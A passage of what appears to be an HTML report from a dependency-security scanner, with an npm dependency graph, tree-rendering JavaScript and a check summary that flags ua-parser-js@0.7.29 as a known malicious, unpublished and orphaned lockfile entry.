:"type-is@1.6.18","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"ua-parser-js@0.7.29","s":"critical","n":4,"sc":"prod","e":"npm","d":0,"t":["[critical] Known malicious package in ua-parser-js@0.7.29: Embedded malware in ua-parser-js","[high] ua-parser-js@0.7.29 is not published on the registry (unpublished or fabricated version)","[medium] ua-parser-js@0.7.29 is in the lockfile but nothing depends on it","[info] New transitive dependency: ua-parser-js@0.7.29"],"b":"critical"},{"l":"unpipe@1.0.0","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"utils-merge@1.0.1","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"vary@1.1.2","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"which@2.0.2","s":null,"n":0,"sc":"prod","e":"npm","d":0,"t":[],"b":null},{"l":"wide-align@1.1.3","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"workerpool@6.1.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"wrap-ansi@7.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"wrappy@1.0.2","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"y18n@5.0.8","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"yargs-parser@20.2.4","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"yargs-unparser@2.0.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"yargs@16.2.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null},{"l":"yocto-queue@0.1.0","s":null,"n":0,"sc":"dev","e":"npm","d":0,"t":[],"b":null}],"kids":[[1,2,3,4,5,33,35,36,51,52,84,94,95,102],[],[],[],[],[],[],[91,101],[],[],[],[26],[103,114],[],[],[],[],[21,30,37,40,69,70,104,116,119,143],[15,28],[53],[],[],[],[11,138],[12,19,62,64,74,78,103,120],[134,136,151],[27],[],[],[122],[],[],[],[34],[111,128,148],[34],[],[96],[98],[],[],[],[],[],[],[],[],[],[],[],[],[43,57,60,86,113,130,132,140],[7,14,17,29,30,31,32,37,40,46,48,50,54,59,88,89,104,108,112,115,116,118,122,124,126,127,131,143,146,147],[141],[37,46,48,104,108,131,145],[83,109],[],[],[],[],[],[],[],[],[78],[61,71,72,93,105,110],[],[],[],[40,72,127,131,142],[123],[105,152],[],[],[16],[],[],[],[75],[],[],[],[13],[107],[],[23],[],[],[],[],[],[90],[],[18],[],[6,8,20,24,38,42,49,55,65,66,68,82,85,93,99,100,125,137,139,148,149,150,154,155,156],[],[],[],[],[],[],[],[],[44],[152],[157],[106],[],[],[],[],[],[140],[],[58,73],[],[122],[],[21,69,70,145],[114],[],[],[],[37,40,41,46,48,50,59,69,92,97,104,118,131],[117],[46,48,108,124],[],[129],[],[140],[],[43],[76,135],[45,77,136],[9],[10],[],[67],[67],[],[79],[],[87,91],[],[],[],[],[81],[133],[],[11,134,136],[],[],[],[22,39,56,80],[25,47,63,121,134,153,154],[]],"orphans":[144]}</script><script>
+(()=>{
+const G=JSON.parse(document.getElementById('gData').textContent), N=G.nodes, K=G.kids;
+const C={critical:'#b3261e',high:'#d9480f',medium:'#c08b00',low:'#3b6fb6',info:'#9aa1a9'};
+const R={critical:4,high:3,medium:2,low:1,info:0};
+const root=document.getElementById('gTree'), risky=document.getElementById('gRisky'), msg=document.getElementById('gMsg');
+const show=i=>!risky.checked || (N[i].b && R[N[i].b]>=1);
+function li(i,anc){
+  const n=N[i], el=document.createElement('li'); el.dataset.i=i;
+  const kids=K[i].filter(k=>!anc.has(k));
+  const tw=document.createElement('span'); tw.className='tw'; tw.textContent=kids.length?'▸':' ';
+  const lab=document.createElement('span'); lab.className='tn'+(n.sc!=='prod'?' dev':'');
+  let h='';
+  if(n.b) h+=`<span class="dot" title="worst below: ${n.b}" style="background:${C[n.b]}"></span>`; else h+='<span class="dot"></span>';
+  h+=n.l.replace(/</g,'&lt;')+(n.sc!=='prod'?` <small>(${n.sc})</small>`:'')+(kids.length?` <small>[${kids.length}]</small>`:'');
+  if(n.s) h+=`<span class="bdg" style="background:${C[n.s]}" title="${(n.t||[]).join('\n').replace(/"/g,'&quot;')}">${n.n} ${n.s}</span>`;
+  lab.innerHTML=h; el.append(tw,lab);
+  el._open=false; el._anc=new Set([...anc,i]);
+  const toggle=()=>{ if(!kids.length) return; if(el._open){el.querySelector('ul')?.remove(); el._open=false; tw.textContent='▸'; return;}
+    const ul=document.createElement('ul'); kids.filter(show).forEach(k=>ul.append(li(k,el._anc)));
+    const hidden=kids.length-ul.children.length; if(hidden){const m=document.createElement('li'); m.innerHTML=`<small>… ${hidden} clean dependenc${hidden>1?'ies':'y'} hidden</small>`; ul.append(m);}
+    el.append(ul); el._open=true; tw.textContent='▾'; };
+  tw.onclick=toggle; lab.ondblclick=toggle; el._toggle=toggle; return el;
+}
+function render(){ root.innerHTML=''; const ul=document.createElement('ul'); ul.append(li(0,new Set())); 
+  if(G.orphans.length){const o=document.createElement('li'); o.innerHTML='<b>Orphans (in lockfile, nothing depends on them)</b>'; const u=document.createElement('ul'); G.orphans.forEach(i=>u.append(li(i,new Set()))); o.append(u); ul.append(o);}
+  root.append(ul); ul.firstChild._toggle(); }
+function expandRisky(el,depth){ if(depth>12) return; const i=+el.dataset.i; if(!(N[i].b && R[N[i].b]>=3)) return;
+  if(!el._open) el._toggle(); el.querySelectorAll(':scope>ul>li').forEach(c=>{ if(c.dataset.i) expandRisky(c,depth+1); }); }
+function pathTo(t){ const prev=new Map([[0,-1]]), q=[0]; while(q.length){const x=q.shift(); if(x===t) break; for(const k of K[x]) if(!prev.has(k)){prev.set(k,x); q.push(k);}}
+  if(!prev.has(t)) return null; const p=[]; for(let x=t;x!==-1;x=prev.get(x)) p.unshift(x); return p; }
+function find(){ const q=document.getElementById('gQ').value.trim().toLowerCase(); if(!q) return;
+  const hits=N.map((n,i)=>[n,i]).filter(([n])=>n.l.toLowerCase().includes(q)).map(([,i])=>i);
+  if(!hits.length){msg.textContent=' no match'; return;}
+  risky.checked=false; render(); let shown=0;
+  for(const t of hits.slice(0,10)){ const p=pathTo(t); if(!p) continue; let el=root.querySelector('li[data-i="0"]');
+    for(const i of p.slice(1)){ if(!el._open) el._toggle(); el=[...el.querySelectorAll(':scope>ul>li')].find(c=>+c.dataset.i===i); if(!el) break; }
+    if(el){ el.querySelector('.tn').classList.add('hit'); shown++; if(shown===1) el.scrollIntoView({block:'center'}); } }
+  msg.textContent=` ${hits.length} match(es), showing path to ${shown}`; }
+risky.onchange=render; document.getElementById('gGo').onclick=find;
+document.getElementById('gQ').onkeydown=e=>{if(e.key==='Enter') find();};
+document.getElementById('gExpand').onclick=()=>{risky.checked=true; render(); expandRisky(root.querySelector('li[data-i="0"]'),0);};
+document.getElementById('gCollapse').onclick=render;
+render();
+})();
+</script>
+<h2>Checks run</h2><ul><li>vulnerabilities: ok (46)</li><li>typosquatting: ok (1)</li><li>install_scripts: ok (3)</li><li>lockfile_integrity: ok (3)</li><li>manifest_consistency: ok (2)</li><li>container_images: ok (3)</li><li>dockerfile: ok (1)</li><li>cicd_workflows: ok (4)</li><li>registry_verification: ok (5)</li><li>baseline_diff: ok (7)</li></ul>
+<h2>Coverage notes &amp; limitations</h2><ul><li>osv: https://api.osv.dev/v1/querybatch: &lt;urlopen error Tunnel connection failed: 403 Forbidden (agent proxy: no rule or network setting allows this host)&gt;</li></ul>
+<p class="meta">Severity here is the initial, detector-assigned risk level. Contextual prioritisation (reachability, exposure, exploitability) is done by the Analyze stage from findings.json. "verified" evidence comes from deterministic data (lockfiles, advisories, registry); "heuristic" evidence is pattern-based and needs review.</p>
+</main>
+<script>
+const f=()=>{const s=sev.value,c=cat.value,t=q.value.toLowerCase(),h=hideinfo.checked;
+document.querySelectorAll("tr.f").forEach(r=>{r.style.display=((!s||r.dataset.sev==s)&&(!c||r.dataset.cat==c)&&(!t||r.textContent.toLowerCase().includes(t))&&!(h&&!s&&r.dataset.sev=="info"))?"":"none"})};
+[sev,cat,q,hideinfo].forEach(x=>x.addEventListener("input",f));f();
+</script></body></html>
